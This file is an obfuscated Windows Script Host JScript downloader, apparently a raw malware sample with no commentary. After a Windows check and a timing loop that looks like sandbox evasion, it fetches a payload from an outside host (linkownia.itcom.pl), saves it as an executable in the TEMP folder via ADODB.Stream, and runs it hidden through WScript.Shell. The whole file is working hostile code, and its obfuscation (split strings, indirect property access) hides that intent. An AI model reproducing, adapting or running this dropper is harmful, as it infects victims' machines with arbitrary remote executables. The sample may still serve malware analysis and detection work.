var _T = false;
var _KE = "CreateObject";
var _S = function _B() {return WScript[_KE]("WScript"+".Shell");}(), _ET = 11;
var _FQ = "MSXML2.XMLHTTP";
var _W = 2123213;
var _SI = 0;
function _LM(_TQ){_S["Run"](_TQ, _SI, _SI);};
function _PC(){return _FQ + "";};
function _AS(_U, _I){_SI = _SI * 1; return _U - _I;};
function _DK(){return _KE;};
/*@cc_on
  @if (@_win32 || @_win64)
    _T = true;
  @end
@*/
if (_T)
{
var _DG = "";
function _AM(){return 22;};
var _P = 0; var _R0 = 0;
function _L()
{
var _DN = new this["Date"]();
var _Q0 = _DN["getUTCMilliseconds"]();
WScript["Sleep"](_AM());
var _DN = new this["Date"]();
var _IY = _DN["getUTCMilliseconds"]();
WScript["Sleep"](_AM());
var _DN = new this["Date"]();
var _HE = _DN["getUTCMilliseconds"]();
var _P = "_J";
_P = _AS(_IY, _Q0);
var _R0 = "_R";
_R0 = _AS(_HE, _IY);
_DG = "open";
return _AS(_P, _R0);
}
var _D0 = false;
var _N = false;
for (var _BR = _SI; _BR < _AM() * 1; _BR++){if (_L() != _SI){
_D0 = true; 
_R0 = "31" + 11 * _P + _R0; 
_N = true; 
break;
}}
function _Q() {return ((_D0 == true) && (_D0 == _N)) ? 1 : _SI;};
if (_D0 && _Q() && _N){
function _WI() {return _S["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "2I7S8lcnmX.ex" + "e";};
 _QK = _PC();
 _LX = WScript[_KE](_QK);
 var _BM = 1;
 while (_BM){
try {
	if (_BM == 1)
	{
		_LX[_DG]("GET", "http://linkownia.itcom.pl/s9aps", false);
		_LX["send"]();
		_O = "Sleep";
	}
	WScript[_O](_AM() + 120); 
	if (_LX["readystate"] < 2 * 2) continue;
	_BM = _SI;
	function _FB(_V) {var _D = (1, 2, 3, 4, 5, _V); return _D;};
	_K0 = WScript[_DK()]("ADODB.Stream");
	_QK = _K0;
	_QK[_DG]();
	_QK["type"] = _FB(1);
	_QK["write"](_LX["ResponseBody"]);
	_K0["position"] = _FB(_SI);
	_QK["Save" + "ToFile"](_WI(), 2);
	_K0["cl"+"ose"]();
	_K = _WI();
	_LM(_K);
} catch(_E){};
}
}
}

